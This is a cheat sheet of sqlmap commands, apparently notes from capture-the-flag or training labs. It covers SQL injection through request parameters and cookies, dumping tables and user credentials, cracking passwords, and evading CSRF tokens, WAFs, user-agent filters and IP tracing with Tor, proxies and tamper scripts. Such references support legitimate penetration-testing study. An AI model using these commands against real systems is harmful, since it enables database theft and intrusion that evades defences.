
# Basic Useful Commands

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# with specified columns
sqlmap -u http://154.57.164.61:31255/case7.php?id=1 -p id --union-cols=5 -D testdb -T flag7 --batch --dump --no-cast

# with specific prefix
sqlmap -u "http://154.57.164.61:31255/case6.php?col=id" --prefix='`)' --no-cast --level=5 --risk=3 -D testdb -T flag6 --dump --batch

# dump specific user
sqlmap -u "http://154.57.164.82:30425/case1.php?id=1" -D testdb -T users -C name,password --dump --where="name LIKE 'Kimberly%'" --batch 

# CSRF bypass
# Craft POST request manually like id=1&token=12347 in req.txt
sqlmap -r req.txt --csrf-token="t0ken" --batch -D testdb -T flag8 --dump

# using tamper script
sqlmap -r req.txt -p "id" --batch -D testdb -T flag11 --dump --tamper=between --flush-session --no-cast

# Assessment
sqlmap -r req.txt \
  --batch \
  --technique=T \
  --tamper=between \
  --fresh-queries \
  --time-sec=5 \
  --threads=1 \
  --sql-query="SELECT HEX(content) FROM production.final_flag LIMIT 1"
```

## HTTP Request Type

```bash
# GET Request  
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  
  
# POST Request  
sqlmap "http://www.example.com/" --data "uid=1&name=test"  
  
# POST Injection Point  
sqlmap "http://www.example.com/" --data "uid=1*&name=test"  
  
# PUT Request  
sqlmap -u "http://www.target.com/vuln.php?id=1" --data="id=1" --method PUT
```

## Testing Cookie

```bash
sqlmap -u "http://154.57.164.70:32070/case3.php" --cookie="id=1" --level=2 --batch --dump
```

# Handling SQLMap Errors

```bash
# Store traffic to an output file
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

# Specify verbosity level
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

# Display Errors
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --parse-errors

# Using Proxy
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

# Basic Enumeration

```bash
# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table/row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

# Advanced DB Enumeration

```bash
# Database schema enumeration
sqlmap -u "http://www.example.com/?id=1" --schema

# Searching for table containing the word "user"
sqlmap -u "http://www.example.com/?id=1" --search -T user

# Searching for column containing the word "user"
sqlmap -u "http://www.example.com/?id=1" --search -C user

# Password enumeration and cracking
sqlmap -u "http://www.example.com/?id=1" --passwords --batch

# skip default dbs
--exclude-sysdbs
```

# Advanced Tuning

```bash
# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Specifying the level and risk
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

```bash
# HTTP Response Detection
# --code
Use when TRUE/FALSE is identified by HTTP status code
Example: 200 = TRUE, 500 = FALSE
sqlmap -u URL --code=200


# --string
Use when TRUE responses contain a specific word
Example: "success" appears only when TRUE
sqlmap -u URL --string="success"


# --titles
Use when TRUE/FALSE differs in <title> tag
sqlmap -u URL --titles


# --text-only
Use when page has noisy HTML (scripts/styles/etc.)
Compares only visible text
sqlmap -u URL --text-only


# SQL Injection Technique Control
# --technique
Force specific SQLi types
B = Boolean-based
E = Error-based
U = UNION-based
T = Time-based
S = Stacked queries

Example (fast + stable set):
sqlmap -u URL --technique=BEU

Skip slow/risky methods:
(remove T = time-based)



# UNION-Based Tuning
# --union-cols
Set number of columns manually (important for UNION success)
sqlmap -u URL --union-cols=17


# --union-char
Change filler character used in UNION SELECT
Default: NULL / random int  
Use when output breaks
sqlmap -u URL --union-char='a'


# --union-from
Add required FROM table (DB-specific like Oracle)
sqlmap -u URL --union-from=users
```

# Bypassing Web Application Protections

```bash
# Anti-CSRF Token Bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# Unique Value Bypass
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch

# Calculated Parameter Bypass
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch

# IP Address Concealing
sqlmap -u URL --proxy="socks4://IP:PORT"
sqlmap -u URL --proxy-file=proxies.txt
# need to install tor
sqlmap -u URL --tor
sqlmap -u URL --tor --check-tor

# WAF Bypass (skip WAF Detection process)
sqlmap -u URL --skip-waf

# User-agent Blacklisting Bypass
sqlmap -u URL --random-agent

# Using tamper scripts (modify payload)
sqlmap -u URL --tamper=randomcase,space2comment

# Splits POST request into chunks
sqlmap -u URL --data="id=1" --chunked


```

### Tamper-Scripts

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |